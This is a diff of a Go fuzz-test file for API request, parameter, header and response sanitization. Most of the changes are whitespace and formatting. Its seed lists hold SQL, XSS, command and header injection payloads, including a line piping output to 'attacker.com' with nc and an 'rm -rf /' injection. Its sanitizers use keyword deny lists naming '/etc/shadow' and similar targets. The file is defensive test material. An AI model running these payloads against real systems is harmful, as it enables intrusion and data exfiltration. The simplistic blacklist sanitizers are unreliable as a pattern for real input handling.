@@ -17,58 +17,58 @@ func FuzzAPIRequestValidation(f *testing.F) {
 		`{"script": "<script>alert(1)</script>"}`,
 		`{"cmd": "$(whoami)"}`,
 		`{"eval": "javascript:alert(document.cookie)"}`,
-		
+
 		// SQL injection in JSON values
 		`{"id": "1'; DELETE FROM users; --"}`,
 		`{"username": "admin'--"}`,
 		`{"password": "' OR '1'='1"}`,
 		`{"query": "UNION SELECT password FROM users"}`,
-		
+
 		// XSS injection in JSON
 		`{"comment": "<img src=x onerror=alert(1)>"}`,
 		`{"description": "'><script>evil()</script>"}`,
 		`{"title": "javascript:alert('xss')"}`,
-		
+
 		// Command injection in JSON
 		`{"filename": "file.txt; rm -rf /"}`,
 		`{"path": "../../../etc/passwd"}`,
 		`{"command": "ls | nc attacker.com 4444"}`,
-		
+
 		// NoSQL injection
 		`{"id": {"$gt": ""}}`,
 		`{"username": {"$ne": null}}`,
 		`{"password": {"$regex": ".*"}}`,
-		
+
 		// LDAP injection in JSON
 		`{"cn": "*)(uid=*))(|(uid=*"}`,
 		`{"filter": "admin)(|(password=*)"}`,
-		
+
 		// Prototype pollution
 		`{"__proto__": {"isAdmin": true}}`,
 		`{"constructor": {"prototype": {"evil": true}}}`,
-		
+
 		// Buffer overflow in JSON
 		`{"data": "` + strings.Repeat("A", 100000) + `"}`,
 		`{"` + strings.Repeat("k", 10000) + `": "value"}`,
-		
+
 		// Unicode attacks in JSON
-		`{"unicode": "café"}`, // Basic Unicode
-		`{"mixed": "аdmin"}`, // Mixed Cyrillic/Latin
+		`{"unicode": "café"}`,    // Basic Unicode
+		`{"mixed": "аdmin"}`,     // Mixed Cyrillic/Latin
 		`{"rtl": "admin\u202e"}`, // Right-to-left override
 		`{"bom": "admin\ufeff"}`, // BOM injection
-		
+
 		// Null byte injection
 		`{"data": "safe\u0000malicious"}`,
 		`{"path": "file.txt\u0000../../etc/passwd"}`,
-		
+
 		// JSON bombs (deeply nested)
 		strings.Repeat(`{"nested":`, 1000) + `"bomb"` + strings.Repeat(`}`, 1000),
-		
+
 		// Invalid JSON (should be rejected)
 		`{"incomplete": }`,
 		`{malformed json}`,
 		`{"unclosed": "value`,
-		
+
 		// Valid JSON (should pass)
 		`{"valid": "data"}`,
 		`{"user": {"name": "john", "age": 30}}`,
@@ -76,11 +76,11 @@ func FuzzAPIRequestValidation(f *testing.F) {
 		`{}`,
 		``,
 	}
-	
+
 	for _, seed := range seeds {
 		f.Add(seed)
 	}
-	
+
 	f.Fuzz(func(t *testing.T, jsonData string) {
 		// Test JSON parsing security
 		var parsed interface{}
@@ -89,23 +89,23 @@ func FuzzAPIRequestValidation(f *testing.F) {
 			// Invalid JSON should be rejected gracefully
 			return
 		}
-		
+
 		// Test API request validation
 		isValid := validateAPIRequest(jsonData)
 		_ = isValid
-		
+
 		// Test JSON sanitization
 		sanitized := sanitizeJSONInput(jsonData)
 		if containsScriptInjection(sanitized) {
 			t.Error("Sanitized JSON contains script injection")
 		}
-		
+
 		// Test size validation
 		if len(jsonData) > 0 {
 			isValidSize := validateRequestSize(len(jsonData))
 			_ = isValidSize
 		}
-		
+
 		// Test prototype pollution protection - verify our protection works
 		if hasPrototypePollution(parsed) {
 			// Prototype pollution detected - now verify our sanitization prevents it
@@ -115,7 +115,7 @@ func FuzzAPIRequestValidation(f *testing.F) {
 				t.Error("Prototype pollution protection failed")
 			}
 		}
-		
+
 		// Test nested object depth - verify our protection works
 		depth := calculateJSONDepth(parsed)
 		if depth > 100 {
@@ -129,7 +129,7 @@ func FuzzAPIRequestValidation(f *testing.F) {
 				}
 			}
 		}
-		
+
 		// Test field validation after sanitization
 		if parsedMap, ok := parsed.(map[string]interface{}); ok {
 			for key, value := range parsedMap {
@@ -157,62 +157,62 @@ func FuzzAPIParameterValidation(f *testing.F) {
 		"' OR '1'='1",
 		"UNION SELECT password FROM users",
 		"1; DELETE FROM accounts",
-		
+
 		// XSS in parameters
 		"<script>alert(1)</script>",
 		"javascript:alert(document.cookie)",
 		"'><img src=x onerror=alert(1)>",
 		"\"><script>evil()</script>",
-		
+
 		// Command injection
 		"; rm -rf /",
 		"| cat /etc/passwd",
 		"$(whoami)",
 		"`id`",
 		"&& malicious",
-		
+
 		// Path traversal
 		"../../../etc/passwd",
 		"..\\..\\..\\windows\\system32\\config\\sam",
 		"....//....//....//etc//passwd",
-		
+
 		// LDAP injection
 		"*)(uid=*))(|(uid=*",
 		"admin)(|(password=*)",
-		
+
 		// Template injection
 		"{{7*7}}",
 		"${7*7}",
 		"<%= 7*7 %>",
 		"{{config.items()}}",
-		
+
 		// Format string attacks
 		"%s%s%s%s",
 		"%n%n%n%n",
 		"%x%x%x%x",
-		
+
 		// Buffer overflow
 		strings.Repeat("A", 100000),
 		strings.Repeat("💀", 10000), // Unicode bomb
-		
+
 		// Unicode attacks
-		"аdmin", // Cyrillic characters
+		"аdmin",       // Cyrillic characters
 		"admin\u202e", // RTL override
 		"admin\ufeff", // BOM
-		
+
 		// Null byte injection
 		"value\x00injected",
 		"safe\x00../../etc/passwd",
-		
+
 		// Email injection
 		"user@example.com\nBcc: attacker@evil.com",
 		"user@example.com\r\nTo: victim@target.com",
-		
+
 		// URL manipulation
 		"http://example.com@evil.com/",
 		"javascript:alert(1)",
 		"data:text/html,<script>alert(1)</script>",
-		
+
 		// Valid parameters
 		"valid_parameter",
 		"user@example.com",
@@ -220,34 +220,34 @@ func FuzzAPIParameterValidation(f *testing.F) {
 		"normal-value_123",
 		"",
 	}
-	
+
 	for _, seed := range seeds {
 		f.Add(seed)
 	}
-	
+
 	f.Fuzz(func(t *testing.T, param string) {
 		// Test parameter validation
 		isValid := validateAPIParameter(param)
 		_ = isValid
-		
+
 		// Test parameter sanitization
 		sanitized := sanitizeAPIParameter(param)
 		if containsInjectionAttempts(sanitized) {
 			t.Error("Sanitized parameter contains injection attempts")
 		}
-		
+
 		// Test parameter encoding
 		encoded := encodeAPIParameter(param)
 		if !utf8.ValidString(encoded) {
 			t.Error("Encoded parameter is not valid UTF-8")
 		}
-		
+
 		// Test parameter length validation
 		if len(param) > 0 {
 			isValidLength := validateParameterLength(param)
 			_ = isValidLength
 		}
-		
+
 		// Test specific injection types
 		if containsSQLInjection(param) {
 			sqlSafe := makeSQLSafe(param)
@@ -255,7 +255,7 @@ func FuzzAPIParameterValidation(f *testing.F) {
 				t.Error("Failed to make parameter SQL-safe")
 			}
 		}
-		
+
 		if containsXSSAttempt(param) {
 			xssSafe := makeXSSSafe(param)
 			if stillContainsXSS(xssSafe) {
@@ -272,38 +272,38 @@ func FuzzAPIHeaderValidation(f *testing.F) {
 		"value\r\nX-Injected: evil",
 		"value\nSet-Cookie: session=hijacked",
 		"value\r\n\r\n<script>alert(1)</script>",
-		
+
 		// Authentication header attacks
 		"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJhdHRhY2tlciJ9.",
 		"Basic YWRtaW46cGFzc3dvcmQ=", // admin:password
 		"Basic $(echo malicious | base64)",
-		
+
 		// Content-Type attacks
 		"application/json; charset=utf-8\r\nX-Evil: injection",
 		"text/html\r\n\r\n<script>alert(1)</script>",
 		"application/x-www-form-urlencoded; boundary=--evil",
-		
+
 		// User-Agent attacks
-		"Mozilla/5.0\r\nX-Forwarded-For: 127.0.0.1",
+		"Mozilla/5.0\r\nX-Forwarded-For: shared.GetInternalHostname",
 		"<script>alert(1)</script>",
 		"$(whoami) Browser",
-		
+
 		// Custom header attacks
 		"api-key\r\nAuthorization: Bearer stolen_token",
 		"correlation-id'; DROP TABLE logs; --",
-		
+
 		// Unicode in headers
-		"válue", // Unicode characters
+		"válue",       // Unicode characters
 		"value\u000a", // Unicode line separator
 		"value\u2028", // Line separator
-		
+
 		// Binary data in headers
 		"value\x00\x01\x02",
 		"\x7f\x80\x81",
-		
+
 		// Long headers (DoS)
 		strings.Repeat("A", 65536),
-		
+
 		// Valid headers
 		"application/json",
 		"Bearer valid_token_123",
@@ -311,32 +311,32 @@ func FuzzAPIHeaderValidation(f *testing.F) {
 		"gzip, deflate, br",
 		"",
 	}
-	
+
 	for _, seed := range seeds {
 		f.Add(seed)
 	}
-	
+
 	f.Fuzz(func(t *testing.T, headerValue string) {
 		// Test header validation
 		isValid := validateAPIHeader(headerValue)
 		_ = isValid
-		
+
 		// Test header sanitization
 		sanitized := sanitizeAPIHeader(headerValue)
 		if containsHeaderInjection(sanitized) {
 			t.Error("Sanitized header contains injection")
 		}
-		
+
 		// Test header encoding validation
 		if !isValidHeaderEncoding(headerValue) {
 			return // Invalid encoding should be rejected
 		}
-		
+
 		// Test header length limits
 		if len(headerValue) > 8192 {
 			return // Oversized headers should be rejected
 		}
-		
+
 		// Test specific header types
 		if isAuthHeader(headerValue) {
 			token := extractToken(headerValue)
@@ -344,7 +344,7 @@ func FuzzAPIHeaderValidation(f *testing.F) {
 				t.Error("Invalid token in auth header")
 			}
 		}
-		
+
 		if isContentTypeHeader(headerValue) {
 			mediaType := extractMediaType(headerValue)
 			if !isAllowedMediaType(mediaType) {
@@ -361,65 +361,65 @@ func FuzzAPIResponseSanitization(f *testing.F) {
 		`{"message": "<script>alert(1)</script>"}`,
 		`{"error": "'><img src=x onerror=alert(1)>"}`,
 		`{"data": "javascript:alert(document.cookie)"}`,
-		
+
 		// Sensitive data exposure
 		`{"password": "secret123"}`,
 		`{"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"}`,
 		`{"credit_card": "4111-1111-1111-1111"}`,
 		`{"ssn": "123-45-6789"}`,
-		
+
 		// Path disclosure
 		`{"error": "File not found: /etc/passwd"}`,
 		`{"path": "/usr/local/app/config/database.yml"}`,
 		`{"stackTrace": "Error at /home/user/.ssh/id_rsa:123"}`,
-		
+
 		// Information disclosure
 		`{"version": "1.0.0-beta", "debug": true}`,
 		`{"database": "postgresql://user:pass@localhost/db"}`,
 		`{"internal_id": "user_12345_internal"}`,
-		
+
 		// Unicode in responses
 		`{"message": "Errör occurred"}`,
 		`{"data": "vаlue"}`, // Mixed scripts
-		
+
 		// Large responses (DoS)
 		`{"data": "` + strings.Repeat("A", 1000000) + `"}`,
-		
+
 		// Valid responses
 		`{"success": true, "data": {"id": 1, "name": "John"}}`,
 		`{"error": "Invalid input provided"}`,
 		`{"status": "OK"}`,
 		"",
 	}
-	
+
 	for _, seed := range seeds {
 		f.Add(seed)
 	}
-	
+
 	f.Fuzz(func(t *testing.T, response string) {
 		// Test response sanitization
 		sanitized := sanitizeAPIResponse(response)
-		
+
 		// Check for XSS removal
 		if containsXSSPatterns(sanitized) {
 			t.Error("Sanitized response contains XSS patterns")
 		}
-		
+
 		// Check for sensitive data removal
 		if containsSensitiveData(sanitized) {
 			t.Error("Sanitized response contains sensitive data")
 		}
-		
+
 		// Check for path disclosure
 		if containsPathDisclosure(sanitized) {
 			t.Error("Sanitized response contains path disclosure")
 		}
-		
+
 		// Test response size limits
 		if len(sanitized) > 10000000 { // 10MB
 			t.Error("Sanitized response exceeds size limit")
 		}
-		
+
 		// Test JSON validity after sanitization
 		if isJSONResponse(sanitized) {
 			var parsed interface{}
@@ -439,36 +439,36 @@ func validateAPIRequest(jsonData string) bool {
 
 func sanitizeJSONField(field string) string {
 	// Comprehensive JSON field sanitization with unified approach
-	
+
 	// First, identify all dangerous patterns without replacing yet
 	dangerousPatterns := []string{
 		// SQL injection patterns
 		"'", "\"", ";", "--", "/*", "*/", "union", "select", "insert", "update", "delete", "drop",
 		"xp_", "sp_", "exec", "execute", "waitfor", "delay", "sleep", "benchmark",
 		"load_file", "outfile", "dumpfile", "information_schema", "pg_sleep",
-		
+
 		// XSS patterns
 		"<script", "</script>", "<iframe", "</iframe>", "<object", "</object>",
 		"<embed", "<applet", "<form", "<meta", "<link", "<style", "<svg",
 		"javascript:", "vbscript:", "data:text/html", "onclick=", "onerror=", "onload=",
 		"eval(", "alert(", "confirm(", "prompt(", "setTimeout(", "setInterval(",
-		
+
 		// Command injection patterns
 		"|", "&", "$(", "`", "&&", "||", ">", "<", "$PATH", "$HOME", "$USER", "$IFS",
 		"${", "rm -rf", "cat /etc", "/etc/passwd", "/etc/shadow",
-		
+
 		// Path traversal patterns
 		"../", ".." + "\\", "....//", "...." + "\\\\", "/etc/", "\\" + "windows" + "\\", "/tmp/", "/var/",
 		"%2e%2e", "..%2f", "..%5c", "%252e%252e", "..%252f",
-		
+
 		// Unicode and special characters
 		"；", "｜", "＆", "＜", "＞",
 	}
-	
+
 	// Apply comprehensive filtering with single replacement
 	result := field
 	lower := strings.ToLower(field)
-	
+
 	for _, pattern := range dangerousPatterns {
 		if strings.Contains(lower, strings.ToLower(pattern)) {
 			// Replace with safe equivalent instead of [FILTERED] to avoid pollution
@@ -479,7 +479,7 @@ func sanitizeJSONField(field string) string {
 			lower = strings.ToLower(result)
 		}
 	}
-	
+
 	// Remove any remaining non-ASCII characters that could hide attacks
 	safeResult := ""
 	for _, r := range result {
@@ -489,14 +489,14 @@ func sanitizeJSONField(field string) string {
 			safeResult += "_" // Replace with safe underscore
 		}
 	}
-	
+
 	return safeResult
 }
 
 func sanitizeJSONInput(jsonData string) string {
 	// Comprehensive JSON input sanitization
 	sanitized := jsonData
-	
+
 	// Remove script tags (case-insensitive, various forms)
 	scriptPatterns := []string{
 		"<script>", "</script>", "<SCRIPT>", "</SCRIPT>",
@@ -505,7 +505,7 @@ func sanitizeJSONInput(jsonData string) string {
 	for _, pattern := range scriptPatterns {
 		sanitized = strings.ReplaceAll(sanitized, pattern, "")
 	}
-	
+
 	// Remove dangerous JavaScript patterns
 	jsPatterns := []string{
 		"javascript:", "vbscript:", "data:text/html",
@@ -515,7 +515,7 @@ func sanitizeJSONInput(jsonData string) string {
 	for _, pattern := range jsPatterns {
 		sanitized = strings.ReplaceAll(sanitized, pattern, "")
 	}
-	
+
 	// Remove dangerous HTML tags
 	htmlPatterns := []string{
 		"<iframe", "<object", "<embed", "<link", "<meta",
@@ -524,12 +524,12 @@ func sanitizeJSONInput(jsonData string) string {
 	for _, pattern := range htmlPatterns {
 		sanitized = strings.ReplaceAll(sanitized, pattern, "")
 	}
-	
+
 	// Remove null bytes and control characters
 	sanitized = strings.ReplaceAll(sanitized, "\x00", "")
 	sanitized = strings.ReplaceAll(sanitized, "\r", "")
 	sanitized = strings.ReplaceAll(sanitized, "\n", "")
-	
+
 	return sanitized
 }
 
@@ -592,7 +592,7 @@ func containsDangerousPatterns(input string) bool {
 	if strings.Contains(input, "[FILTERED]") {
 		return false
 	}
-	
+
 	patterns := []string{
 		"<script>", "javascript:", "'; DROP", "$(", "`",
 		"../", "..\\", "\x00", "rm -rf", "cat /etc/passwd",
@@ -614,13 +614,13 @@ func validateAPIParameter(param string) bool {
 
 func sanitizeAPIParameter(param string) string {
 	// Comprehensive parameter sanitization using proven techniques
-	
+
 	// Remove null bytes and control characters
 	sanitized := strings.ReplaceAll(param, "\x00", "")
 	sanitized = strings.ReplaceAll(sanitized, "\r", "")
 	sanitized = strings.ReplaceAll(sanitized, "\n", "")
 	sanitized = strings.ReplaceAll(sanitized, "\t", "")
-	
+
 	// Remove dangerous script patterns using case-insensitive replacement
 	dangerousPatterns := []string{
 		"<script>", "</script>", "javascript:", "vbscript:",
@@ -632,20 +632,20 @@ func sanitizeAPIParameter(param string) string {
 		"<iframe", "<object", "<embed", "<svg", "<img",
 		"expression(", "@import", "url(", "style=",
 	}
-	
+
 	// Apply case-insensitive filtering using the helper function
 	for _, pattern := range dangerousPatterns {
 		sanitized = replaceAllCaseInsensitive(sanitized, pattern, "[FILTERED]")
 	}
-	
+
 	// Additional safety: remove any remaining angle brackets
 	sanitized = strings.ReplaceAll(sanitized, "<", "[FILTERED]")
 	sanitized = strings.ReplaceAll(sanitized, ">", "[FILTERED]")
-	
+
 	// Remove quotes that could be used for injection
 	sanitized = strings.ReplaceAll(sanitized, "'", "[FILTERED]")
 	sanitized = strings.ReplaceAll(sanitized, "\"", "[FILTERED]")
-	
+
 	return sanitized
 }
 
@@ -675,7 +675,7 @@ func containsSQLInjection(input string) bool {
 
 func makeSQLSafe(input string) string {
 	// Comprehensive SQL injection prevention - reuse the robust sanitization from enhanced_input_validation_fuzz_test.go
-	
+
 	// Remove dangerous SQL keywords and operators
 	dangerous := []string{
 		";", "--", "/*", "*/", "xp_", "sp_", "exec", "execute",
@@ -686,28 +686,28 @@ func makeSQLSafe(input string) string {
 		"load_file", "outfile", "dumpfile", "information_schema",
 		"pg_sleep", "dbms_pipe", "dbms_lock", "sys.", "sysobjects",
 	}
-	
+
 	result := input
 	lower := strings.ToLower(input)
-	
+
 	for _, keyword := range dangerous {
 		if strings.Contains(lower, strings.ToLower(keyword)) {
 			// Use comprehensive case-insensitive replacement
 			result = replaceAllCaseInsensitive(result, keyword, "[FILTERED]")
 		}
 	}
-	
+
 	// Remove remaining quotes entirely for security
 	result = strings.ReplaceAll(result, "'", "[FILTERED]")
 	result = strings.ReplaceAll(result, "\"", "[FILTERED]")
 	result = strings.ReplaceAll(result, "`", "[FILTERED]")
-	
+
 	// Remove control characters that could be used for injection
 	result = strings.ReplaceAll(result, "\x00", "")
 	result = strings.ReplaceAll(result, "\r", "")
 	result = strings.ReplaceAll(result, "\n", " ")
 	result = strings.ReplaceAll(result, "\t", " ")
-	
+
 	// Remove any non-ASCII characters that could hide attacks
 	safeResult := ""
 	for _, r := range result {
@@ -717,7 +717,7 @@ func makeSQLSafe(input string) string {
 			safeResult += "[FILTERED]" // Replace non-ASCII with filtered marker
 		}
 	}
-	
+
 	return safeResult
 }
 
@@ -731,25 +731,25 @@ func containsXSSAttempt(input string) bool {
 
 func makeXSSSafe(input string) string {
 	// Comprehensive XSS prevention using proven techniques from enhanced_input_validation_fuzz_test.go
-	
+
 	// Remove complete dangerous HTML tags (not just start tags)
 	dangerousTagPatterns := []string{
-		"<script", "</script>", "<iframe", "</iframe>", 
+		"<script", "</script>", "<iframe", "</iframe>",
 		"<object", "</object>", "<embed", "<applet", "</applet>",
 		"<form", "</form>", "<meta", "<link", "<base",
 		"<style", "</style>", "<frame", "<frameset", "</frameset>",
 		"<xml", "</xml>", "<import", "<svg", "</svg>",
 	}
-	
+
 	result := input
-	
+
 	// First, remove complete tag patterns with content
 	for _, pattern := range dangerousTagPatterns {
 		for strings.Contains(strings.ToLower(result), strings.ToLower(pattern)) {
 			result = replaceAllCaseInsensitive(result, pattern, "[FILTERED]")
 		}
 	}
-	
+
 	// Remove dangerous JavaScript event handlers and protocols
 	dangerousAttrs := []string{
 		"javascript:", "vbscript:", "data:text/html", "data:application",
@@ -760,30 +760,30 @@ func makeXSSSafe(input string) string {
 		"expression(", "eval(", "alert(", "confirm(", "prompt(",
 		"setTimeout(", "setInterval(", "Function(", "@import", "url(",
 	}
-	
-	// Remove dangerous attributes and protocols (case-insensitive)  
+
+	// Remove dangerous attributes and protocols (case-insensitive)
 	for _, attr := range dangerousAttrs {
 		result = replaceAllCaseInsensitive(result, attr, "[FILTERED]")
 	}
-	
+
 	// Remove any remaining opening/closing angle brackets to prevent tag reconstruction
 	result = strings.ReplaceAll(result, "<", "[FILTERED]")
 	result = strings.ReplaceAll(result, ">", "[FILTERED]")
-	
+
 	// Remove HTML entity encoding that could hide attacks
 	result = strings.ReplaceAll(result, "&#", "[FILTERED]")
 	result = strings.ReplaceAll(result, "&lt;", "[FILTERED]")
 	result = strings.ReplaceAll(result, "&gt;", "[FILTERED]")
 	result = strings.ReplaceAll(result, "&quot;", "[FILTERED]")
 	result = strings.ReplaceAll(result, "&amp;", "[FILTERED]")
-	
+
 	// Remove control characters and dangerous characters
 	result = strings.ReplaceAll(result, "\x00", "")
 	result = strings.ReplaceAll(result, "\r", "")
 	result = strings.ReplaceAll(result, "\n", "")
 	result = strings.ReplaceAll(result, "`", "[FILTERED]")
 	result = strings.ReplaceAll(result, "\\", "[FILTERED]")
-	
+
 	return result
 }
 
@@ -796,15 +796,15 @@ func stillContainsXSS(input string) bool {
 }
 
 func validateAPIHeader(headerValue string) bool {
-	return !strings.Contains(headerValue, "\r") && 
-		   !strings.Contains(headerValue, "\n") && 
-		   len(headerValue) <= 8192
+	return !strings.Contains(headerValue, "\r") &&
+		!strings.Contains(headerValue, "\n") &&
+		len(headerValue) <= 8192
 }
 
 func sanitizeAPIHeader(headerValue string) string {
 	// Comprehensive header sanitization
 	sanitized := headerValue
-	
+
 	// Remove CRLF injection patterns
 	sanitized = strings.ReplaceAll(sanitized, "\r", "")
 	sanitized = strings.ReplaceAll(sanitized, "\n", "")
@@ -812,25 +812,25 @@ func sanitizeAPIHeader(headerValue string) string {
 	sanitized = strings.ReplaceAll(sanitized, "%0a", "")
 	sanitized = strings.ReplaceAll(sanitized, "%0D", "")
 	sanitized = strings.ReplaceAll(sanitized, "%0A", "")
-	
+
 	// Remove null bytes
 	sanitized = strings.ReplaceAll(sanitized, "\x00", "")
-	
+
 	// Remove dangerous script patterns that might be in headers
 	dangerousPatterns := []string{
 		"<script>", "</script>", "javascript:", "vbscript:",
 		"eval(", "setTimeout(", "$(", "`",
 	}
-	
+
 	for _, pattern := range dangerousPatterns {
 		sanitized = strings.ReplaceAll(sanitized, pattern, "")
 	}
-	
+
 	// Ensure header value is reasonable length
 	if len(sanitized) > 8192 {
 		sanitized = sanitized[:8192]
 	}
-	
+
 	return sanitized
 }
 
@@ -844,7 +844,7 @@ func isValidHeaderEncoding(headerValue string) bool {
 
 func isAuthHeader(headerValue string) bool {
 	return strings.HasPrefix(strings.ToLower(headerValue), "bearer ") ||
-		   strings.HasPrefix(strings.ToLower(headerValue), "basic ")
+		strings.HasPrefix(strings.ToLower(headerValue), "basic ")
 }
 
 func extractToken(headerValue string) string {
@@ -861,7 +861,7 @@ func isValidToken(token string) bool {
 
 func isContentTypeHeader(headerValue string) bool {
 	return strings.Contains(strings.ToLower(headerValue), "application/") ||
-		   strings.Contains(strings.ToLower(headerValue), "text/")
+		strings.Contains(strings.ToLower(headerValue), "text/")
 }
 
 func extractMediaType(headerValue string) string {
@@ -882,7 +882,7 @@ func isAllowedMediaType(mediaType string) bool {
 func sanitizeAPIResponse(response string) string {
 	// Comprehensive response sanitization
 	sanitized := response
-	
+
 	// Remove XSS patterns
 	xssPatterns := []string{
 		"<script>", "</script>", "<SCRIPT>", "</SCRIPT>",
@@ -893,7 +893,7 @@ func sanitizeAPIResponse(response string) string {
 	for _, pattern := range xssPatterns {
 		sanitized = strings.ReplaceAll(sanitized, pattern, "")
 	}
-	
+
 	// Redact sensitive data patterns
 	sensitivePatterns := map[string]string{
 		"password":    "***",
@@ -905,7 +905,7 @@ func sanitizeAPIResponse(response string) string {
 		"api_key":     "***",
 		"bearer":      "***",
 	}
-	
+
 	for pattern, replacement := range sensitivePatterns {
 		// Case-insensitive replacement
 		re := strings.NewReplacer(
@@ -915,7 +915,7 @@ func sanitizeAPIResponse(response string) string {
 		)
 		sanitized = re.Replace(sanitized)
 	}
-	
+
 	// Remove path disclosure patterns
 	pathPatterns := []string{
 		"/etc/", "/usr/", "/home/", "/var/", "/root/",
@@ -924,7 +924,7 @@ func sanitizeAPIResponse(response string) string {
 	for _, pattern := range pathPatterns {
 		sanitized = strings.ReplaceAll(sanitized, pattern, "[PATH]")
 	}
-	
+
 	return sanitized
 }
 
@@ -965,7 +965,7 @@ func preventPrototypePollution(jsonData string) string {
 		"__proto__", "constructor", "prototype",
 		"__defineGetter__", "__defineSetter__", "__lookupGetter__", "__lookupSetter__",
 	}
-	
+
 	sanitized := jsonData
 	for _, pattern := range dangerous {
 		sanitized = strings.ReplaceAll(sanitized, "\""+pattern+"\"", "\"[FILTERED]\"")
@@ -978,7 +978,7 @@ func limitJSONDepth(jsonData string, maxDepth int) string {
 	// Simple depth limiting by counting braces
 	depth := 0
 	result := ""
-	
+
 	for _, char := range jsonData {
 		if char == '{' || char == '[' {
 			depth++
@@ -991,7 +991,7 @@ func limitJSONDepth(jsonData string, maxDepth int) string {
 		}
 		result += string(char)
 	}
-	
+
 	return result
 }
 
